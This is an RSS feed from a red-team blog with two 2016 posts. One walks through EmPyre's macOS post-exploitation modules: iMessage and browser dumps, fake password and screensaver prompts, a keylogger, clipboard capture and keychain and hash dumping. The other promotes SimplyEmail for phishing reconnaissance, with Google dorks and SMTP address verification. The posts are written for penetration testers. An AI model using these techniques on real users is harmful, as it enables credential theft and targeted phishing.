<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Post-rsses on Cyber Syndicates</title>
    <link>http://dev.cybersyndicates.com/post/index.xml</link>
    <description>Recent content in Post-rsses on Cyber Syndicates</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Alexander Rymdeko-Harvey</copyright>
    <lastBuildDate>Tue, 21 Jun 2016 20:14:14 +0000</lastBuildDate>
    <atom:link href="http://dev.cybersyndicates.com/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>EmPyre Collection Operations</title>
      <link>http://dev.cybersyndicates.com/2016/06/empyre-collection-opperations/</link>
      <pubDate>Tue, 21 Jun 2016 20:14:14 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2016/06/empyre-collection-opperations/</guid>
      <description>

&lt;p&gt;



    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 50%; width: 50%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_logo.png&#34; alt=&#34;Empyre Logo&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

This post is number 4 of the EmPyre series. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;

&lt;p&gt;@rvrsh3ll — @harmj0y — @xorrior — @CptJesus&lt;/p&gt;

&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;master-list-of-the-seriers-here-http-www-harmj0y-net-blog-empyre-building-an-empyre-with-python&#34;&gt;Master list of the seriers: &lt;a href=&#34;http://www.harmj0y.net/blog/empyre/building-an-empyre-with-python/&#34;&gt;Here&lt;/a&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;5/12/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;Building an EmPyre with Python&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/18/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://Operating with EmPyre&#34;&gt;Operating with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/24/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;https://www.xorrior.com/the-return-of-the-empyre/&#34;&gt;The Return Of the EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/31/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/empyre/os-x-office-macros-with-empyre/&#34;&gt;OS X Office Macros with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;empyre-introduction-to-collection-operations&#34;&gt;&lt;strong&gt;EmPyre: Introduction to collection operations&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Information gathering may be one of the most vital actions to execute on a target. When it comes to EmPyre, we have implemented a suite of tools and techniques to accomplish a large subset of our needs. The interesting part about collection is it’s often used at nearly every phase of the attack cycle. This week we will be covering the various pre &amp;amp; post collection modules we have built!&lt;/p&gt;

&lt;h4 id=&#34;pre-escalation-collection-methods&#34;&gt;&lt;strong&gt;Pre-Escalation Collection Methods&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;One of our favorite, and easiest, methods is collecting a large subset of user information in OS X. Due the heavy use of SQL to store user information, it is extremely easy to query this data. For instance: with the “browser_dump” module we can start an operation to obtain browser history, which helps gain situational awareness of the target system. While this can be used in many scenarios, it is especially useful because the module does not require an elevated context; as such, it may give you pointers for the target you&amp;rsquo;re currently on. Once you are up and running in EmPyre you can dump our user’s browser history for Safari and Chrome.&lt;/p&gt;

&lt;p&gt;After quickly generating some history on my test VM we have data!&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/browser_dump_empyre.png&#34; alt=&#34;Empyre Browser Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Next up on SQL data: the iMessage data store! iMessage data store is used by many targets, and is often synced with iCloud (SMS and IMessage data). The interesting thing about the iMessage app is its ability to integrate multiple chat platforms - not just standard iMessaging from Apple. Examples of platforms with this funcionality include: Yahoo, Jabber, Aol, AIM, Google, etc.  Information collection through data mining is sometimes needed for additional escalation, and iMessage makes a great location to search for data like passwords. Using the “imessage_dump” module we can search for specific terms in the users iMessage data store. This will enumerate the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Account – The corresponding account user&lt;/li&gt;
&lt;li&gt;Service – The provider of the message&lt;/li&gt;
&lt;li&gt;Country – Where the message originated&lt;/li&gt;
&lt;li&gt;Number – If a text message, will be the senders telephone number&lt;/li&gt;
&lt;li&gt;ROWID – This is the row the message was stored, can be helpful if you pull the DB back&lt;/li&gt;
&lt;li&gt;Date – Date of the message&lt;/li&gt;
&lt;li&gt;Message – The text enumerated from the selected message&lt;/li&gt;
&lt;li&gt;Type – Secondary field for the type of account used within the app&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;



    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_message_dump.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

The next method of collection requires using osascript (Apples scripting language) we are able to force applications to prompt for credentials potentially gathering a password! Here is the “Prompt” module in action:&lt;/p&gt;

&lt;p&gt;



    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_prompt_attack.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

Once setup we can easily force the App of choice to prompt a dialog box requesting a password. This can be a great method to gather credentials and potentially escalate. This and the next module have been adapted from work from &lt;a href=&#34;https://twitter.com/fuzzynop?lang=en&#34;&gt;@FuzzyNop&lt;/a&gt;, so big shout out the work he puts in.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_prompt_attack2.png&#34; alt=&#34;Empyre Message Dump 2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One of my fellow friends, @enigma0x3 (&lt;a href=&#34;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/&#34;&gt;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)&lt;/a&gt;) has an interesting technique to get credentials on engagments using the standard Windows login prompt. The great part is OS X has something similar we are able to implement into our collection strategy. Using the osascript method we can easily weaponize the “ScreenSaverEngine” application to request credentials.  We can force the standard screensaver, request creds, and test them against the current users Apple Key Chain. Using the &lt;strong&gt;security&lt;/strong&gt; command we can lock the users key chain and use the creds supplied to attempt to unlock using the follwing command: **security unlock-keychain –p Test. **This can be easily deployed in a loop to only unlock the screensaver when the user successfully enters the correct credentials. While it may not be extremely OPSEC friendly, it may go unnoticed and sucessfuly result in creds.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_screensaver_prompt.png&#34; alt=&#34;Empyre Screen Saver Prompt&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;A user will be prompted repeatedly until successful creds or the exit count is reached.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_screensaver_prompt2.png&#34; alt=&#34;Empyre Screen Saver Prompt2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One of the key collection modules we use during an engagment is clipboard collection. The main reason clipboard monitoring is key in our tradecraft is due to the ease of collection when keylogging fails to capture creds. This allows you to gather credentials and target specific times when password vaults are used in conjunction with the screenshot. Allowing for targeted collection of potential passwords and sensitive data. Using native API calls NSPasteboard, NSStringPboardType we can prevent using built in commands and potential signatures that could get us caught.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_clipboard_monitor.png&#34; alt=&#34;Empyre Clipboard monitor&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;h3 id=&#34;post-exploit-collection-methods&#34;&gt;&lt;strong&gt;Post-Exploit Collection Methods&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Often during operations, we move from a recon &amp;amp; escalation stage to a post exploitation information gathering process. This is truly the heart of end state operations and proper tools can help speed up the process as well as help a tester reach the data / show impact. When EmPyre was being developed we often attempted to explain and relate it to processes and procedures used during a windows environment.&lt;/p&gt;

&lt;p&gt;The first module I want to start with is the screenshot module. Due to testers reliance on this module it may be one of the most important post exploitation modules in our arsenal. While EmPyre currently supports two different techniques of screenshot, the native_screenshot module may be concern if certain AV products are in place. This is due to using the &lt;em&gt;screenshot&lt;/em&gt; command, and potential logging.  While the standard module uses system APIs to capture the screen, parse the image, and drop to disk in a temporary location. During my research I did uncover a few methods to properly parse all the images completely in memory, but currently due to lack of the PIL library standalone 2.7 does not have the ability to parse completely in memory.  So relying on the Quartz API is a current constraint in this method.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_native_screenshoot.png&#34; alt=&#34;Empyre Native Screenshot&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One feature within the EmPyre code base is different tasking types. This allows for different code paths of execution. For example, the iMessage module used dynamic code execution while the screenshot uses dynamic code execution with saved output. This is done by dropping to disk, opening the file, base64ing the raw file and the EmPyre server, and then saving it to your downloads folder. This makes for easy file management for modules and keeps things organized.&lt;/p&gt;

&lt;p&gt;Once basic situational awareness has been completed on a target, we often transition to reaching end state client goals. This is often referred to as the “Crown Jewels” or high value targets. Generally, it takes a large amount of post exploitation intelligence and the ability to collect on all your endpoints. Keylogging is an amazing technique that has been extremely successful for gathering creds, enumerating users work roles, collecting info, or even understanding the tools they are using to interact with the asset. Bellow you will see this being employed using an adapted ruby keylogger. @ joev  (&lt;a href=&#34;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r&#34;&gt;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r)&lt;/a&gt;)&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_keylogger.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the key logger is up and running you can easily check it using the built in shell commands or once complete kill the PID, use the built in download, and delete the file from disk.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_keylogger2.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the file has been retrieved from the target you will have something similar (to the below) representing the application, key stroke, and keyboard commands.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_keylogger3.png&#34; alt=&#34;Empyre Keylogger 3&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;While operating on OS X you for sure miss the ease of mimikatz for gathering credentials, but while password collection is possible in some cases cracking potential evaluated accounts, admins or service accounts may be extremely useful for lateral movement. Within EmPyre we have built in the ability for hashdump and nicely output these hashes in hashcat ready format!&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_hashdump.png&#34; alt=&#34;Empyre Hashdump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;It is often thought that due to the out-of-the box setup that lateral movement is just not an option. This is not always the case in the corporate environments. Admins are generally going to administrate, right? They need some method of software, patch, or user management for their end points. This can result in SSH being deployed to most corporate OS X assets, or maybe a custom solution. While this blog does not cover the Kerberos implications, in corporate environments, due to the heavy use of Active Directory it can be an entirely new method of lateral movement. Stay tuned for more on that subject!&lt;/p&gt;

&lt;p&gt;The last module we will be covering is the keychaindump. While this module may result in a large subset of user data and crucial passwords it does have limitations. Currently, this will not work against the latest OS X platform. The latest usable version was Yosemite, due to a vulnerability that allowed for researches to pull the master key candidate from memory once in an elevated state. Due to the new System Integrity Protections (SIP) in El Captain the ability to retrieve this master key has been properly stored in memory protected by SIP.  Not all hope is lost though! I have been extremely successful in using other tools to parse the keychain with the user’s credentials. This can be done with either a memory image or the keychain file itself.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_keychain_dump.png&#34; alt=&#34;Empyre Keychain Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the keychain is local we can use a python tool called chainbreaker (&lt;a href=&#34;https://github.com/n0fate/chainbreaker&#34;&gt;https://github.com/n0fate/chainbreaker)&lt;/a&gt;). This allows for the use of the password or the master key and will parse and decrypt the entire keychain offline. While this requires the password, a root context is not needed to download the keychain, allowing for offline attempts against the keychain which can be quite useful.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;http://dev.cybersyndicates.com/image/empyre_keychain_dump2.png&#34; alt=&#34;Empyre Keychain Dump2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Hopefully this has helped clear up different use cases when it comes to EmPyre collection operations and the corresponding modules. As always we plan to release blogs near weekly covering the different use cases of EmPyre, next the team will be covering the injection of Kerberos tickets&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Reconnaissance and Phishing Template Generation Made Simple</title>
      <link>http://dev.cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</link>
      <pubDate>Thu, 26 May 2016 21:56:58 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Author: Alexander Rymdeko-Harvey, @Killswitch_GUI &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;First a big thanks to the entire ATD (Adaptive Threat Divsion) team which contributed ideas, support and templates! &lt;a href=&#34;https://www.verisgroup.com/blog/category/adaptive-threat-division/&#34;&gt;https://verisgroup.com/blog/category/adaptive-threat-division/&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/cptjesus&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @cptjesus&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/sixdub&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @sixdub&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/xorrior&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @xorrior&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/424f424f&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @424f424f&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/enigma0x3&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @enigma0x3&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/mattifestation&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @mattifestation&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/_wald0&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @_wald0&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/bluscreenofjeff&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @bluscreenofjeff&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h4 id=&#34;email-reconnaissance-and-phishing-template-generation-made-simple&#34;&gt;Email Reconnaissance and Phishing Template Generation Made Simple&lt;/h4&gt;

&lt;p&gt;As a red-teamer or pen-tester, the need for tools that speed up the process is absolutely critical. While tools are not everything, they sure do help when it comes to performing an engagement within a short timeframe that a threat actor would have months to execute. With limited time and the need for effective methodologies, phishing can be a tester’s worst nightmare but also the best path to success. I found that proper reconnaissance and preparation are extremely important when it comes to phishing. I set out to speed up the process while still employing effective methodologies for upcoming and future engagements.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Email Recon Methodology and name creation:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Over the past few months, I put quite a bit of time into research and current methods that are being used to perform email harvesting. While every tester has a few different methods to get the most out of their recon, most rely upon search indexing and searching for documents. Using this methodology is generally slow and takes up valuable time. One of the major concerns was the ability to cover as much content as possible, with so many documents and locations to search I often missed email data I should have caught.  I knew right away there was room for improvement.&lt;/p&gt;

&lt;p&gt;Using tools like theHarvester has been a great resource for myself and other testers. This tool uses Google and Bing to automatically scrape emails by parsing raw HTML. This tool is used often on engagements and was a huge inspiration to building out a few more features. Here are a few of the sources I knew would be gold mines:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;PasteBin&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Past data dumps&lt;/li&gt;
&lt;li&gt;Raw HTML of target site&lt;/li&gt;
&lt;li&gt;EmailHunter – &lt;a href=&#34;http://emailhunter.co&#34;&gt;http://emailhunter.co&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I discovered that using HTML parsing over more traditional API searches allows a user to search content that may not yet supply an API. This was the case for a ton of the resources that I wanted to target moving forward with my research. While API based searches have their place, I focused on free and easily accessible data for my gathering techniques. Using advanced Google search operators you can retrieve a list of all .xlsx files currently indexed on Google. Parsing the results was all done manually and finding them took some time.  “Google dorks” that I often employed during my recon phase:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Site:verisgroup.com filetype:doc &amp;ndash; Site: verisgroup.com filetype:docx&lt;/li&gt;
&lt;li&gt;Site: verisgroup.com filetype:xls &amp;ndash; Site: verisgroup.com filetype:doc&lt;/li&gt;
&lt;li&gt;Site: verisgroup.com filetype:pdf&lt;/li&gt;
&lt;li&gt;site:pastebin.com &amp;ldquo;@target.com&amp;rdquo;&lt;/li&gt;
&lt;li&gt;“@target.com”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When searching the web for emails, you have to get creative. An issue I found out early on was the reliability of indexed data, which has to do with indexing and other factors. But I found this out time and time again when it came to searching for new and interesting sources, such as Yahoo, Reddit, Ask, Whois Data, or even PGP keys. These queries may only find 1 or 2 more emails but in the long run, but they add up and you can show your client the visibility they have on the web.&lt;/p&gt;

&lt;p&gt;While email recon can get you a good start or initial vector of attack, covering a larger set of data or targets requires secondary techniques, in particular, inferring email addresses from names. This has been used and talked about pretty thoroughly. One tool that implements this technique is PhishBait (&lt;a href=&#34;https://github.com/pan0pt1c0n/PhishBait&#34;&gt;https://github.com/pan0pt1c0n/PhishBait)&lt;/a&gt;), which scrapes LinkedIn names from Bing to build out a potential email using predictable formats. Will Schroeder (@harmj0y) produced a to scrape names from Connect6 - a sourcing database of employees and their companies. Between these two sites, recent phishing campaigns have seen significantly more success. An example “Google dork” for Connect6:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;site:connect6.com target.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During a standard test it can be useful to attempt to verify the emails gathered. Using the target’s mail server, we can test for SMTP return codes that could potentially support the verify behavior. This simply opens up a connection to the target SMTP server, starts to create a message for an internal recipient and checks for the return codes (250 or 550). By providing the SMTP server a known invalid address, the tester can test if it returns with a 250 code. If this is the case, the server is known as a “catch all”. If anything other than a 250 is returned, we are in luck and can verify the emails gathered and built from name generation!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The Birth of SimplyEmail:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After months of performing the above methodology, consuming roughly a half day of a test time with inaccuracy, I knew there was room within the industry to build a tool that was focused on simplifying the process and improving the accuracy of the information gathered. Many tools built in the security industry have many facets and are generally Swiss army knives in their realm. I knew from the start that SimplyEmail had to do only (simply) email, backed by a framework that would allow other members on the team or industry contribute with ease. Thus, the concept of SimplyEmail was born, and has evolved in accuracy and capability in the email reconnaissance realm.&lt;/p&gt;

&lt;p&gt;Currently, SimplyEmail has 25 modules ranging in capabilities and fidelity. Major sources searched are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;HTML scrape of the targets web site&lt;/li&gt;
&lt;li&gt;PasteBin&lt;/li&gt;
&lt;li&gt;Exalead search – PDF –XLSX – DOCX –PDF&lt;/li&gt;
&lt;li&gt;Google Search – PDF XLS/XLSX –DOC/DOCX –PDF&lt;/li&gt;
&lt;li&gt;PGP keys&lt;/li&gt;
&lt;li&gt;Instagram&lt;/li&gt;
&lt;li&gt;Reddit&lt;/li&gt;
&lt;li&gt;Ask Search&lt;/li&gt;
&lt;li&gt;Yahoo Search&lt;/li&gt;
&lt;li&gt;Whois Search&lt;/li&gt;
&lt;li&gt;GitHub user – Code – Gist&lt;/li&gt;
&lt;li&gt;Flickr&lt;/li&gt;
&lt;li&gt;Cannary Bin – API&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The SimplyEmail framework uses a Task controller and a Producer Consumer model that allows testers to easily write modules, while the framework handles parsing, process creation and formatting. To get started with SimplyEmail you simply:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    
  1. git clone &amp;lt;a href=&amp;quot;http://github.com/killswitch-GUI/SimplyEmail.git&amp;quot;&amp;gt;http://github.com/killswitch-GUI/SimplyEmail.git&amp;lt;/a&amp;gt;
  2. ./sh install.sh(Kali 2 or Debian Currently Supported) 
  3. ./SimplyEmail –l or ./SimplyEmail –h

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the installation of SimplyEmail, it’s time to give it a go:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  1. ./SimplyEmail –all –e YOURTARGET.com –n –verify
    –all = Use all modules
    –e = Your target domain
    –n = Names generation
    –Verify = Attempt to verify your discovered emails Address
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/2016/05/pic1.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic1.png&#34; alt=&#34;pic1&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After the initial email scrape is complete name generation is conducted. Using the built-in LinkedIn Bing scraper, SimplyEmail will start building names using LinkedIn &amp;amp; Connect6:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic2.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic2.png&#34; alt=&#34;pic2&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic3.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic3.png&#34; alt=&#34;pic3&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next, name generation will be completed. SimplyEmail has two methods to determine the email format. First, it attempts to use EmailHunter’s JSON API to detect the format of the emails. If that fails, SimplyEmail has a built-in class designed to detect the following supported formats:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;{first}.{last} = &lt;a href=&#34;mailto:alex.alex@domain.com&#34;&gt;alex@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}{last} = &lt;a href=&#34;mailto:jamesharvey@domain.com&#34;&gt;jamesharvey@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{f}{last} = &lt;a href=&#34;mailto:ajames@domain.com&#34;&gt;ajames@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{f}.{last} = &lt;a href=&#34;mailto:a.james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}{l} = &lt;a href=&#34;mailto:jamesh@domain.com&#34;&gt;jamesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}.{l} = &lt;a href=&#34;mailto:j.amesh@domain.com&#34;&gt;amesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}_{last} = &lt;a href=&#34;mailto:james_amesh@domain.com&#34;&gt;james_amesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first} = &lt;a href=&#34;mailto:james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic4.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic4.png&#34; alt=&#34;pic4&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly, as testers, we all know the importance of reporting and the ability to digest the data we just captured. SimplyEmail has a few great reporting options that are built into the tool. The standard text report and HTML file that will show all non-unique emails with the corresponding sources where SimplyEmail found those emails.&lt;/p&gt;

